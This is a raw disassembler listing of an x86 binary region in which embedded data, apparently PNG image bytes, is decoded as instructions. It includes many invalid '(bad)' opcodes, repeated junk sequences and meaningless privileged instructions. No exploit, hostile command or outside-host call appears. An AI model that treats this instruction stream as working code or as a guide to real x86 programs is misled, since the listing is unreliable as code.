  406e88:	dec    esp
  406e89:	das    
  406e8a:	pop    ds
  406e8b:	push   ds
  406e8c:	and    ebx,DWORD PTR [edx]
  406e8e:	dec    esi
  406e8f:	ds cmp eax,0x40543530
  406e95:	sbb    al,0x9
  406e97:	push   esi
  406e98:	pop    ecx
  406e99:	pop    ebx
  406e9a:	cmp    esp,DWORD PTR [edx]
  406e9c:	sub    BYTE PTR [eax],ah
  406e9e:	dec    esi
  406e9f:	ds inc eax
  406ea1:	add    DWORD PTR [edx],eax
  406ea3:	push   esp
  406ea4:	ds sbb eax,0x34145221
  406eaa:	pop    ebx
  406eab:	sub    al,0x2c
  406ead:	sub    DWORD PTR [esi+0x40],ecx
  406eb0:	push   esi
  406eb1:	inc    esi
  406eb2:	push   esp
  406eb3:	push   esp
  406eb4:	or     dl,BYTE PTR ds:[eax]
  406eb7:	adc    al,0x16
  406eb9:	and    al,0x48
  406ebb:	push   esi
  406ebc:	es and eax,0x404e
  406ec2:	add    BYTE PTR [esi+edi*1+0x10],dl
  406ec6:	adc    bl,BYTE PTR [ebx]
  406ec8:	push   ss
  406ec9:	cs sub eax,0x4e264958
  406ecf:	inc    esp
  406ed0:	add    BYTE PTR [eax],al
  406ed2:	add    BYTE PTR [esi+edi*1+0xd],dl
  406ed6:	push   cs
  406ed7:	adc    eax,0x33332718
  406edc:	xor    DWORD PTR [edx],ebp
  406ede:	dec    esi
  406edf:	inc    esp
  406ee0:	add    BYTE PTR [eax],al
  406ee2:	add    BYTE PTR [esi+edi*1+0x3e],dl
  406ee6:	ds ds aas 
  406ee9:	inc    eax
  406eea:	inc    esp
  406eeb:	inc    esp
  406eec:	inc    esp
  406eed:	inc    esi
  406eee:	dec    esi
  406eef:	inc    esp
  406ef0:	add    BYTE PTR [eax],al
  406ef2:	add    BYTE PTR [eax+0x54],bl
  406ef5:	push   esp
  406ef6:	push   esp
  406ef7:	push   esp
  406ef8:	push   esp
  406ef9:	push   esp
  406efa:	dec    esi
  406efb:	dec    esi
  406efc:	push   ebx
  406efd:	dec    esi
  406efe:	dec    esi
  406eff:	push   esi
	...
  406f10:	(bad)  
  406f11:	inc    DWORD PTR [eax]
  406f13:	add    BYTE PTR [edi+eax*1],bl
  406f16:	add    BYTE PTR [eax],al
  406f18:	sbb    al,0xf
  406f1a:	add    BYTE PTR [eax],al
  406f1c:	pop    ds
  406f1d:	pop    ds
	...
  406f3a:	add    BYTE PTR [eax],al
  406f3c:	loopne 0x406f3e
  406f3e:	add    BYTE PTR [eax],al
  406f40:	loopne 0x406f42
  406f42:	add    BYTE PTR [eax],al
  406f44:	loopne 0x406f46
  406f46:	add    BYTE PTR [eax],al
  406f48:	loopne 0x406f4a
  406f4a:	add    BYTE PTR [eax],al
  406f4c:	(bad)  
  406f4d:	inc    DWORD PTR [eax]
  406f4f:	add    BYTE PTR [ecx+0xd474e50],cl
  406f55:	or     bl,BYTE PTR [edx]
  406f57:	or     al,BYTE PTR [eax]
  406f59:	add    BYTE PTR [eax],al
  406f5b:	or     eax,0x52444849
  406f60:	add    BYTE PTR [eax],al
  406f62:	add    DWORD PTR [eax],eax
  406f64:	add    BYTE PTR [eax],al
  406f66:	add    DWORD PTR [eax],eax
  406f68:	or     BYTE PTR [esi],al
  406f6a:	add    BYTE PTR [eax],al
  406f6c:	add    BYTE PTR [edx+esi*2-0x58],bl
  406f70:	data16 add BYTE PTR [eax],al
  406f73:	and    BYTE PTR [eax],al
  406f75:	dec    ecx
  406f76:	inc    esp
  406f77:	inc    ecx
  406f78:	push   esp
  406f79:	js     0x406f17
  406f7b:	in     al,dx
  406f7c:	mov    ebp,0xc92cb059
  406f81:	jns    0x406f62
  406f83:	test   ebx,0x4fdeaacc
  406f89:	neg    DWORD PTR [ecx-0x12]
  406f8c:	cmp    eax,DWORD PTR ds:[esi]
  406f8f:	sbb    DWORD PTR [ecx],0x0
  406f92:	add    al,0x41
  406f94:	pusha  
  406f95:	inc    eax
  406f96:	pop    eax
  406f97:	add    BYTE PTR [edi],dl
  406f99:	or     DWORD PTR [eax],edx
  406f9b:	add    DWORD PTR [ecx-0x29a4daec],ecx
  406fa1:	sbb    dl,BYTE PTR [esi+0x3f2ae0ed]
  406fa7:	(bad)  
  406fa9:	mov    ebx,0x41ea37ad
  406fae:	and    DWORD PTR ds:0xd17a1c38,edi
  406fb4:	add    esp,DWORD PTR ds:0x8a1c9f87
  406fba:	mov    al,0xb5
  406fbc:	adc    dh,BYTE PTR [ecx+eax*1]
  406fbf:	adc    ah,BYTE PTR [eax]
  406fc1:	or     BYTE PTR [edx+0x20067018],al
  406fc7:	data16 add BYTE PTR [ecx],0x6
  406fcb:	mov    bl,0xdf
  406fcd:	mov    ecx,0x3e967afb
  406fd2:	mov    ebp,0x7e9992d4
  406fd7:	enter  0xeacc,0xac
  406fdb:	jmp    0x773:0x33def73e
  406fe2:	or     edx,ebp
  406fe4:	pop    edi
  406fe5:	inc    esp
  406fe6:	lahf   
  406fe7:	rcr    DWORD PTR [ebp-0x6b],cl
  406fea:	mov    ch,0x65
  406fec:	in     eax,0xf7
  406fee:	iret   
  406fef:	push   DWORD PTR [edi+0x65ac2664]
  406ff5:	sub    eax,0x5acb596b
  406ffa:	(bad)  
  406ffb:	mov    dl,0x96
  406ffd:	mov    ch,0xac
  406fff:	gs sub eax,0x5acb596b
  407005:	(bad)  
  407006:	mov    dl,0x96
  407008:	mov    ch,0xac
  40700a:	gs sub eax,0x5acb596b
  407010:	(bad)  
  407011:	mov    dl,0x96
  407013:	mov    ch,0xac
  407015:	gs sub eax,0x5acb596b
  40701b:	(bad)  
  40701c:	mov    dl,0x96
  40701e:	mov    ch,0xac
  407020:	gs sub eax,0x5acb596b
  407026:	(bad)  
  407027:	mov    dl,0x96
  407029:	mov    ch,0xac
  40702b:	gs sub eax,0x5acb596b
  407031:	(bad)  
  407032:	mov    dl,0x96
  407034:	mov    ch,0xac
  407036:	gs sub eax,0x5acb596b
  40703c:	(bad)  
  40703d:	mov    dl,0x96
  40703f:	mov    ch,0xac
  407041:	gs sub eax,0x5acb596b
  407047:	(bad)  
  407048:	mov    dl,0x96
  40704a:	mov    ch,0xac
  40704c:	gs sub eax,0x5acb596b
  407052:	(bad)  
  407053:	mov    dl,0x96
  407055:	mov    ch,0xac
  407057:	gs sub eax,0x5acb596b
  40705d:	(bad)  
  40705e:	mov    dl,0x96
  407060:	mov    ch,0xac
  407062:	gs sub eax,0x5acb596b
  407068:	(bad)  
  407069:	mov    dl,0x96
  40706b:	mov    ch,0xac
  40706d:	gs sub eax,0x5acb596b
  407073:	(bad)  
  407074:	mov    dl,0x96
  407076:	mov    ch,0xac
  407078:	gs sub eax,0x5acb596b
  40707e:	(bad)  
  40707f:	mov    dl,0x96
  407081:	mov    ch,0xac
  407083:	gs sub eax,0x5acb596b
  407089:	(bad)  
  40708a:	mov    dl,0x96
  40708c:	mov    ch,0xac
  40708e:	gs sub eax,0x5acb596b
  407094:	(bad)  
  407095:	mov    dl,0x96
  407097:	mov    ch,0xac
  407099:	gs sub eax,0x5acb596b
  40709f:	(bad)  
  4070a0:	mov    dl,0x96
  4070a2:	mov    ch,0xac
  4070a4:	gs sub eax,0xc452396b
  4070aa:	psubq  mm0,QWORD PTR [esi]
  4070ad:	jle    0x4070cb
  4070af:	in     eax,0x7f
  4070b1:	jmp    DWORD PTR [edi-0x1]
  4070b4:	lods   al,BYTE PTR ds:[esi]
  4070b5:	mov    edi,0x3ea5b5b5
  4070ba:	cld    
  4070bb:	hlt    
  4070bc:	sar    DWORD PTR [esp+esi*8],cl
  4070bf:	enter  0x7923,0xb7
  4070c3:	xlat   BYTE PTR ds:[ebx]
  4070c4:	xor    edi,DWORD PTR [ebp+0x61ff2f5e]
  4070ca:	(bad)  
  4070cc:	pop    edx
  4070cd:	(bad)  
  4070ce:	jb     0x40712c
  4070d0:	pop    ecx
  4070d1:	add    eax,eax
  4070d3:	xor    ebp,esp
  4070d5:	repz mov edi,0xd5a27bf7
  4070db:	push   0xfffffffd
  4070dd:	mov    ss,WORD PTR [eax]
  4070df:	loop   0x407144
  4070e1:	(bad)  
  4070e2:	fimul  DWORD PTR [ebx+0x42]
  4070e5:	mov    bl,cl
  4070e7:	mov    bl,0xc9
  4070e9:	in     al,0x5a
  4070eb:	pop    ecx
  4070ec:	adc    al,0x37
  4070ee:	rcl    DWORD PTR [esi-0x15],cl
  4070f1:	bound  ebx,QWORD PTR [edx-0xc8420dc]
  4070f7:	cmc    
  4070f8:	xlat   BYTE PTR ds:[ebx]
  4070f9:	pop    edi
  4070fa:	mov    esi,0x18c2e17c
  4070ff:	cwde   
  407100:	std    
  407101:	outs   dx,DWORD PTR ds:[esi]
  407102:	push   esp
  407104:	lahf   
  407105:	into   
  407106:	jle    0x4070e0
  407108:	idiv   DWORD PTR [esi+edx*4+0x6b251cb5]
  40710f:	add    BYTE PTR [eax],bh
  407111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407112:	cld    
  407113:	rcr    DWORD PTR [edi],0xfc
  407116:	inc    ecx
  407117:	push   edi
  407118:	dec    ecx
  407119:	stc    
  40711a:	jge    0x40713d
  40711c:	les    eax,FWORD PTR [ebx+0x2a]
  40711f:	dec    ebp
  407120:	push   ecx
  407121:	adc    BYTE PTR [eax+0xa],0x21
  407125:	add    al,0xd6
  407127:	pop    edx
  407128:	retf   0xc8a2
  40712b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40712c:	xchg   ebx,eax
  40712d:	dec    ecx
  40712e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40712f:	mov    ch,0xbe
  407131:	outs   dx,BYTE PTR ds:[esi]
  407132:	mov    WORD PTR [ecx+0x7d],?
  407135:	ss popf 
  407137:	mov    esi,0xbfdfde35
  40713c:	outs   dx,BYTE PTR ds:[esi]
  40713d:	lods   eax,DWORD PTR ds:[esi]
  40713e:	mov    ebp,0x79798c68
  407143:	mov    esp,0x70e17fbf
  407148:	cmp    al,0xbe
  40714a:	and    eax,0xafff1885
  40714f:	mov    edi,0xfd95bf5
  407154:	sti    
  407155:	jns    0x40712d
  407157:	repnz pop edi
  407159:	mov    dh,0xac
  40715b:	add    eax,esp
  40715d:	cwde   
  40715e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407160:	das    
  407161:	jge    0x40714c
  407163:	xor    al,0xf0
  407165:	sub    dh,BYTE PTR [eax]
  407167:	dec    eax
  407168:	xchg   ebx,eax
  407169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40716a:	mov    esi,0x594c0853
  40716f:	xchg   edx,eax
  407170:	out    0x39,eax
  407172:	push   ss
  407173:	adc    BYTE PTR [edx+0x20],al
  407176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407177:	inc    esp
  407178:	sub    ebp,esp
  40717a:	jbe    0x4070ff
  40717c:	sub    ebx,ecx
  40717e:	xor    dl,bl
  407180:	pop    edx
  407181:	out    dx,eax
  407182:	add    DWORD PTR [edi+0x77b8b80b],ebp
  407188:	sti    
  407189:	test   ch,0xc9
  40718c:	loope  0x40716f
  40718e:	sub    eax,0x70c6d6e0
  407193:	js     0x407205
  407195:	repz cli 
  407197:	cmc    
  407198:	sbb    ecx,0x74
  40719b:	mov    edx,0x8fa3e0fb
  4071a0:	out    dx,al
  4071a1:	in     eax,dx
  4071a2:	pushf  
  4071a3:	cmp    al,0x39
  4071a5:	(bad)  
  4071a6:	out    0xd7,al
  4071a8:	mov    esi,0x93fa7e36
  4071ad:	lahf   
  4071ae:	pushf  
  4071af:	cld    
  4071b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b1:	dec    edi
  4071b2:	jge    0x40715e
  4071b4:	cld    
  4071b5:	sar    DWORD PTR [esi],0xe9
  4071b8:	pop    edx
  4071b9:	dec    BYTE PTR [ebx-0x70]
  4071bc:	xor    eax,0xfe531c00
  4071c1:	loopne 0x4071ce
  4071c3:	pop    edi
  4071c4:	clc    
  4071c5:	dec    ecx
  4071c6:	test   eax,0x2b40b3d4
  4071cb:	dec    ebp
  4071cc:	push   ebx
  4071cd:	mov    bh,0xd1
  4071cf:	pop    edx
  4071d0:	lods   al,BYTE PTR ds:[esi]
  4071d1:	jo     0x407228
  4071d3:	test   eax,0xcb2c92cb
  4071d8:	mov    al,0xd6
  4071da:	and    al,BYTE PTR [ebp+0x85dbf00]
  4071e0:	adc    DWORD PTR [edx+edx*1+0x28024084],0x25021485
  4071eb:	and    eax,0x4210492a
  4071f0:	push   eax
  4071f1:	push   0xffffff8d
  4071f3:	aad    0x1a
  4071f5:	sub    DWORD PTR [ebp+0x5ac28846],esp
  4071fb:	pop    ebx
  4071fc:	push   0xffffffad
  4071fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071ff:	dec    ecx
  407200:	xchg   edx,eax
  407201:	mov    esp,0x34bca521
  407206:	lahf   
  407207:	dec    esi
  407208:	das    
  407209:	into   
  40720a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40720b:	rcl    edi,cl
  40720d:	mov    bh,0x4f
  40720f:	sahf   
  407210:	cmp    al,0xf
  407212:	pop    esp
  407213:	jge    0x407208
  407215:	aad    0x57
  407217:	fistp  QWORD PTR [edx]
  407219:	jno    0x407215
  40721b:	hlt    
  40721c:	in     eax,dx
  40721d:	pop    edi
  40721e:	clc    
  40721f:	int3   
  407220:	addr16 out 0x3f,al
  407223:	mov    WORD PTR [edx-0x407034a8],?
  407229:	lods   al,BYTE PTR ds:[esi]
  40722a:	add    eax,esp
  40722c:	cwde   
  40722d:	repnz stc 
  40722f:	das    
  407230:	jl     0x407213
  407232:	out    0x12,eax
  407234:	sub    edi,edi
  407236:	adc    BYTE PTR [ecx],ah
  407238:	fs retf 
  40723a:	add    eax,DWORD PTR [eax+0x7917f68d]
  407240:	dec    esi
  407241:	xchg   ecx,eax
  407242:	out    0x58,eax
  407244:	jmp    0x4071fc
  407246:	or     ch,BYTE PTR [ecx]
  407248:	adc    DWORD PTR [esi],ebx
  40724a:	add    al,0xa4
  40724c:	adc    BYTE PTR [eax],ah
  40724e:	and    eax,0x7ef15f02
  407253:	pop    edi
  407254:	add    BYTE PTR [edx],cl
  407256:	adc    esi,edi
  407258:	sti    
  407259:	std    
  40725a:	popa   
  40725b:	lahf   
  40725c:	add    DWORD PTR [edi+ebp*1-0x69acffd5],esp
  407263:	and    BYTE PTR [esi+ebp*1+0x2108998d],al
  40726a:	sub    DWORD PTR cs:[ecx],esp
  40726d:	scas   al,BYTE PTR es:[edi]
  40726e:	sbb    BYTE PTR [eax+0x1afb580],bh
  407274:	pop    ss
  407275:	xchg   ebp,eax
  407276:	adc    BYTE PTR [edi-0x7b],dl
  407279:	xchg   esp,eax
  40727a:	scas   eax,DWORD PTR es:[edi]
  40727b:	sbb    ah,BYTE PTR [ebx-0x52]
  40727e:	or     ch,BYTE PTR [ecx]
  407280:	addr16 jg 0x407264
  407283:	adc    ebx,DWORD PTR [edi-0x4a784ca8]
  407289:	lods   al,BYTE PTR ds:[esi]
  40728a:	xchg   esp,eax
  40728b:	in     al,0xee
  40728d:	inc    ebp
  40728e:	(bad)  
  40728f:	adc    cl,BYTE PTR [ebx-0x5e]
  407292:	aam    0xc8
  407294:	sbb    ah,BYTE PTR [ebx]
  407296:	in     eax,0x8a
  407298:	jge    0x40729c
  40729a:	xor    dh,al
  40729c:	pusha  
  40729d:	ins    BYTE PTR es:[edi],dx
  40729e:	add    al,0x9
  4072a0:	(bad)  
  4072a1:	cmp    BYTE PTR [esi],dl
  4072a3:	and    BYTE PTR ds:0x31a45ac6,ah
  4072a9:	pop    eax
  4072aa:	jg     0x407260
  4072ac:	lock int3 
  4072ae:	rcr    DWORD PTR [edx-0x75],0xc0
  4072b2:	add    DWORD PTR [ecx-0x8],ecx
  4072b5:	outs   dx,DWORD PTR ds:[esi]
  4072b6:	mov    eax,ds:0xa98c2cce
  4072bb:	add    ah,0x9f
  4072be:	pop    ebp
  4072bf:	and    eax,0xc6343249
  4072c4:	or     al,0x8d
  4072c6:	mov    ch,0xef
  4072c8:	seta   BYTE PTR [ebx-0x3dd296c0]
  4072cf:	cwde   
  4072d0:	cdq    
  4072d1:	test   BYTE PTR [ebp+0x6b],bh
  4072d4:	int3   
  4072d5:	test   DWORD PTR [edi+0x15ccf33f],ebp
  4072db:	and    ebp,esp
  4072dd:	test   DWORD PTR [ebp-0xd6fa84b],0x4dea52b2
  4072e7:	imul   ebp,ebp,0x2b
  4072ea:	inc    eax
  4072eb:	test   BYTE PTR cs:[eax],ch
  4072ee:	test   DWORD PTR [eax],edx
  4072f0:	lds    eax,FWORD PTR [edi+0x3e]
  4072f3:	repnz adc DWORD PTR [ebp+0x5f],edi
  4072f7:	sub    ebp,DWORD PTR [edx+0x2d]
  4072fa:	aas    
  4072fb:	push   ss
  4072fc:	mov    dl,0x6
  4072fe:	and    BYTE PTR [ebx-0x76],0xd1
  407302:	cli    
  407303:	test   BYTE PTR [eax],cl
  407305:	mov    ebp,0xad695e35
  40730a:	lods   eax,DWORD PTR ds:[esi]
  40730b:	xchg   esp,eax
  40730c:	push   esi
  40730d:	or     BYTE PTR [ecx+0x2b],al
  407310:	dec    ebp
  407311:	adc    DWORD PTR [edx+0x60],eax
  407314:	lods   al,BYTE PTR ds:[esi]
  407315:	lds    ebx,FWORD PTR [edx]
  407317:	jecxz  0x4072f1
  407319:	xor    BYTE PTR [ebp-0x4d62d6f8],0x1b
  407320:	add    edx,DWORD PTR [edx-0x7e]
  407323:	mov    ch,0xa0
  407325:	xor    eax,0x16674a46
  40732a:	pop    eax
  40732b:	pop    ebx
  40732c:	arpl   WORD PTR [edx],ax
  40732e:	add    BYTE PTR [esi-0x294cb2fb],al
  407334:	push   esi
  407335:	xlat   BYTE PTR ds:[ebx]
  407336:	lds    ebx,FWORD PTR [eax]
  407338:	mov    ah,0x31
  40733a:	aad    0x3d
  40733c:	inc    eax
  40733d:	popf   
  40733e:	into   
  40733f:	pop    ecx
  407340:	imul   edi,DWORD PTR [ebx+0x7108ba06],0xffffffc6
  407347:	xchg   esp,eax
  407348:	lds    edi,FWORD PTR gs:[esi]
  40734b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40734c:	xor    DWORD PTR [eax+0x63],ebx
  40734f:	dec    edx
  407350:	and    ebp,esp
  407352:	inc    esp
  407353:	ret    0x95a1
  407356:	jb     0x407364
  407358:	in     al,dx
  407359:	jle    0x40734e
  40735b:	(bad)  
  40735e:	pop    es
  40735f:	mov    BYTE PTR [edx-0x78],0x3d
  407363:	and    esp,eax
  407365:	ins    DWORD PTR es:[edi],dx
  407366:	pusha  
  407367:	(bad)  
  407369:	or     bh,BYTE PTR [edx+eiz*1-0x27ec877c]
  407370:	pop    es
  407371:	popw   ds
  407373:	(bad)  
  407374:	lock xchg edi,edx
  407377:	inc    eax
  407378:	icebp  
  407379:	out    0x48,eax
  40737b:	(bad)  
  40737c:	add    BYTE PTR [eax+0x4c],dh
  40737f:	xor    esi,eax
  407381:	ins    BYTE PTR es:[edi],dx
  407382:	add    DWORD PTR [ebx+ecx*1],esp
  407385:	(bad)  
  407386:	push   ds
  407387:	or     BYTE PTR [ecx-0x59],al
  40738a:	fucom  st(6)
  40738c:	lea    esi,[edi]
  40738e:	(bad)  
  407390:	(bad)  
  407391:	mov    edi,0xddba45f2
  407396:	xchg   esp,eax
  407397:	loope  0x407409
  407399:	xchg   ebx,eax
  40739a:	lods   eax,DWORD PTR ds:[esi]
  40739b:	lods   eax,DWORD PTR ds:[esi]
  40739c:	sbb    eax,0xfa4dc346
  4073a1:	or     DWORD PTR ds:0x2d16ad5a,0xffffffd5
  4073a8:	es ins DWORD PTR es:[edi],dx
  4073aa:	mov    ch,0x2b
  4073ac:	pop    edx
  4073ad:	(bad)  
  4073ae:	mov    ch,0x60
  4073b0:	mov    WORD PTR [ebx+0x1],fs
  4073b3:	inc    edx
  4073b4:	mov    eax,0xa45adf1e
  4073b9:	pop    es
  4073ba:	or     eax,DWORD PTR [edx-0x67]
  4073bd:	add    BYTE PTR [eax],cl
  4073bf:	jle    0x407440
  4073c1:	adc    bl,ch
  4073c3:	scas   eax,DWORD PTR es:[edi]
  4073c4:	sub    eax,0x20c0b97c
  4073c9:	loop   0x4073c8
  4073cb:	and    al,BYTE PTR [edx]
  4073cd:	adc    cl,BYTE PTR [ecx+ecx*1+0x66304de7]
  4073d4:	test   DWORD PTR fs:[eax],ebx
  4073d7:	(bad)
  4073da:	sub    edi,DWORD PTR [ecx+0xd]
  4073dd:	sbb    bl,BYTE PTR [eax-0x31fff1f]
  4073e3:	repz iret 
  4073e5:	aas    
  4073e6:	call   FWORD PTR [edx+0xe22e210]
  4073ec:	sbb    al,0x5e
  4073ee:	add    ebx,esi
  4073f0:	adc    al,0x42
  4073f2:	pop    esp
  4073f3:	push   es
  4073f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f5:	pop    ds
  4073f6:	cli    
  4073f7:	rol    BYTE PTR [edi+0x1f8d51d6],1
  4073fd:	xor    ebx,DWORD PTR [ecx+0x3]
  407400:	shl    BYTE PTR [ecx],0x45
  407403:	sub    DWORD PTR [ebp-0x1abae9a3],esi
  407409:	rol    bl,1
  40740b:	test   edx,0xc1ca56ad
  407411:	rcr    DWORD PTR [eax+0x5df9f4ff],0xa6
  407418:	xor    eax,DWORD PTR [ebp-0x51]
  40741b:	jae    0x4073a6
  40741d:	rol    DWORD PTR [esi+0x46],1
  407420:	mov    edi,0xb69d05b
  407425:	dec    esi
  407426:	in     al,dx
  407427:	or     al,0xd9
  407429:	(bad)  
  40742b:	pusha  
  40742c:	jae    0x407402
  40742e:	cmp    BYTE PTR [si],bl
  407431:	mov    dl,0xbd
  407433:	jge    0x4073b7
  407435:	shr    DWORD PTR [eax-0x6d],1
  407438:	lea    ecx,[ebp-0x68b162df]
  40743e:	and    al,0x6d
  407440:	xchg   ecx,eax
  407441:	mov    ah,0x5a
  407443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407444:	dec    ecx
  407445:	mov    dh,BYTE PTR [ecx+0x7057ac06]
  40744b:	add    ebx,DWORD PTR [eax-0x15]
  40744e:	(bad)  
  40744f:	loope  0x4074a9
  407451:	inc    eax
  407452:	in     al,dx
  407453:	jae    0x40745d
  407455:	xlat   BYTE PTR ds:[ebx]
  407456:	scas   eax,DWORD PTR es:[edi]
  407457:	jle    0x40741b
  407459:	add    dl,BYTE PTR [esp+edi*8]
  40745c:	jle    0x40740f
  40745e:	inc    edx
  40745f:	mov    cl,0x2b
  407461:	(bad)  
  407462:	mov    dl,0xe2
  407464:	sbb    DWORD PTR [ebx+0x4c],ebp
  407467:	add    edx,DWORD PTR [ebp+esi*4+0x18842076]
  40746e:	add    BYTE PTR [edi],cl
  407470:	add    BYTE PTR [edi-0x7f30eb94],bl
  407476:	cmp    DWORD PTR [eax-0x17],esi
  407479:	fcmovnu st,st(7)
  40747b:	(bad)  
  40747c:	imul   BYTE PTR [ebx-0x3bdeda40]
  407482:	adc    eax,0x22e015e0
  407487:	jo     0x4074da
  407489:	or     BYTE PTR [ecx+0x13],dh
  40748c:	cwde   
  40748d:	jl     0x40747f
  40748f:	sbb    DWORD PTR [edi],0xffffffb4
  407492:	lods   al,BYTE PTR ds:[esi]
  407493:	in     eax,0x47
  407495:	dec    edx
  407496:	(bad)  
  407497:	add    BYTE PTR [eax+0x4c],dh
  40749a:	mov    cl,0xc6
  40749c:	mov    esp,0x1acf7c07
  4074a1:	jp     0x40750a
  4074a3:	inc    eax
  4074a4:	and    bl,BYTE PTR [eax-0x10518d33]
  4074aa:	(bad)  
  4074ab:	adc    al,0xd3
  4074ad:	fnstcw WORD PTR [ecx]
  4074af:	lods   al,BYTE PTR ds:[esi]
  4074b0:	sub    al,0xe0
  4074b2:	jp     0x40743d
  4074b4:	adc    al,0x86
  4074b6:	inc    esp
  4074b7:	int    0x69
  4074b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ba:	arpl   WORD PTR [edx-0x37],bx
  4074bd:	sbb    BYTE PTR [ebp+0x75c9a4a6],ah
  4074c3:	cli    
  4074c4:	mov    ebp,0x86da74eb
  4074c9:	jbe    0x4074d6
  4074cb:	mov    dh,0xb7
  4074cd:	ficomp DWORD PTR [ecx+edi*1-0x548c982f]
  4074d4:	ret    
  4074d5:	jo     0x4074af
  4074d7:	cmp    BYTE PTR gs:[eax-0x2f],ch
  4074db:	jmp    0x407503
  4074dd:	je     0x407519
  4074df:	or     ebp,ebx
  4074e1:	outs   dx,BYTE PTR ds:[esi]
  4074e2:	fwait
  4074e3:	outs   dx,BYTE PTR ds:[esi]
  4074e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074e5:	dec    edi
  4074e6:	fisubr DWORD PTR [edx-0x2d]
  4074e9:	push   0x75
  4074eb:	push   0x49243ab5
  4074f0:	dec    edx
  4074f1:	xchg   edx,eax
  4074f2:	sub    BYTE PTR [esp+ecx*2+0x6b41cf9c],dl
  4074f9:	je     0x4074fb
  4074fb:	push   es
  4074fc:	fistp  WORD PTR [ebx+0x358166c7]
  407502:	push   es
  407503:	loope  0x40751e
  407505:	mov    ecx,DWORD PTR ds:0xe0a084be
  40750b:	shl    DWORD PTR [ebx],1
  40750d:	les    ecx,FWORD PTR [edx+0x3b8100df]
  407513:	in     eax,dx
  407514:	imul   ebx,DWORD PTR [ebx+0x6b],0xffffffdb
  407518:	inc    edx
  407519:	mov    BYTE PTR [ecx],dl
  40751b:	lock add esi,0x3d82c37e
  407522:	mov    esp,0x2f8be2f2
  407527:	pop    esi
  407528:	push   es
  407529:	cs js  0x40756c
  40752c:	fadd   DWORD PTR [ebx]
  40752e:	mov    al,0xbe
  407531:	adc    BYTE PTR [edx-0x29],ah
  407534:	jg     0x407555
  407536:	add    edi,DWORD PTR [ebx+0x42]
  407539:	mov    cl,ch
  40753b:	push   ebx
  40753c:	dec    edi
  40753d:	cmp    eax,0xfe5c76b5
  407542:	add    BYTE PTR [ebp+ecx*1+0x0],ah
  407546:	(bad)  
  407547:	nop
  407548:	(bad)  
  40754a:	popf   
  40754b:	fild   QWORD PTR [ecx-0x6b]
  40754e:	pop    edx
  40754f:	jg     0x407501
  407551:	jmp    0xa14a:0x25b2bdfd
  407558:	lods   eax,DWORD PTR ds:[esi]
  407559:	out    0xd6,al
  40755b:	lods   eax,DWORD PTR ds:[esi]
  40755c:	sub    DWORD PTR [ebp-0x67],esp
  40755f:	pusha  
  407560:	inc    ebp
  407561:	loope  0x4075cf
  407563:	jl     0x40759f
  407565:	sbb    BYTE PTR [ebx+0x5c88f5c8],ch
  40756b:	aas    
  40756c:	sub    BYTE PTR [ebx-0x27e7fe92],0xc5
  407573:	pop    ds
  407574:	outs   dx,DWORD PTR ds:[esi]
  407575:	inc    eax
  407576:	sbb    BYTE PTR [eax],dh
  407578:	and    eax,0xf4d08050
  40757d:	cmp    eax,DWORD PTR [edi+0x7487db74]
  407583:	cmp    esi,DWORD PTR [ebx+0x7a]
  407586:	popf   
  407587:	cmp    ebx,eax
  407589:	fisub  WORD PTR [ecx]
  40758b:	mov    ebp,0x276e8cf6
  407590:	jecxz  0x407576
  407592:	dec    esi
  407593:	(bad)  
  407594:	popf   
  407595:	in     eax,dx
  407596:	add    DWORD PTR [ebx],ebx
  407598:	sbb    ebx,DWORD PTR ds:0xd83736b6
  40759e:	(bad)  
  4075a0:	mov    ds:0xd8321fd7,al
  4075a5:	sbb    dl,dl
  4075a7:	in     eax,dx
  4075a8:	or     eax,0x548a5448
  4075ad:	mov    ah,BYTE PTR [ecx+esi*8]
  4075b0:	adc    DWORD PTR [edx],ecx
  4075b2:	arpl   WORD PTR [ecx+ebx*4+0x1a9efe01],bx
  4075b9:	retf   0x92cc
  4075bc:	out    dx,eax
  4075bd:	loopne 0x4075ac
  4075bf:	add    al,0x51
  4075c2:	mov    edi,0xd6b7d025
  4075c7:	test   BYTE PTR [ebp+0x2a8ee710],0x8b
  4075ce:	xor    esi,DWORD PTR [ebx]
  4075d0:	dec    edx
  4075d1:	call   FWORD PTR [ecx]
  4075d3:	add    esp,edi
  4075d5:	pop    edi
  4075d6:	jp     0x4075c1
  4075d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075d9:	stos   DWORD PTR es:[edi],eax
  4075da:	rcr    BYTE PTR [ebx-0x4873b3d4],0x80
  4075e1:	aaa    
  4075e2:	add    BYTE PTR [ebx],0x21
  4075e5:	(bad)  
  4075e6:	cld    
  4075e7:	jge    0x4075d8
  4075e9:	jnp    0x4075ca
  4075eb:	call   0xc003:0x5907dc4d
  4075f2:	xor    DWORD PTR [ebp+eiz*1+0x49],eax
  4075f6:	xlat   BYTE PTR ds:[ebx]
  4075f7:	push   0xfffffffd
  4075f9:	push   eax
  4075fa:	aad    0x78
  4075fc:	inc    ebx
  4075fd:	mov    WORD PTR [edi+0x29],ds
  407600:	mov    WORD PTR [esi],gs
  407602:	mov    ecx,0x368c737e
  407607:	fwait
  407608:	mov    esi,0x16e5074
  40760d:	ret    0x2d7a
  407610:	mov    ebp,eax
  407612:	mov    edx,0x122060f0
  407617:	call   DWORD PTR [ecx-0x67dfebe0]
  40761d:	xchg   esp,eax
  40761e:	or     DWORD PTR [ebx-0x38273dbe],edx
  407624:	add    al,0x64
  407626:	xchg   BYTE PTR [eax+0x5272251a],dl
  40762c:	xor    eax,0xd2ee9da1
  407631:	dec    esi
  407632:	(bad)  
  407633:	je     0x40768f
  407635:	xchg   DWORD PTR [ebx+edi*2],ecx
  407638:	mov    bh,0x18
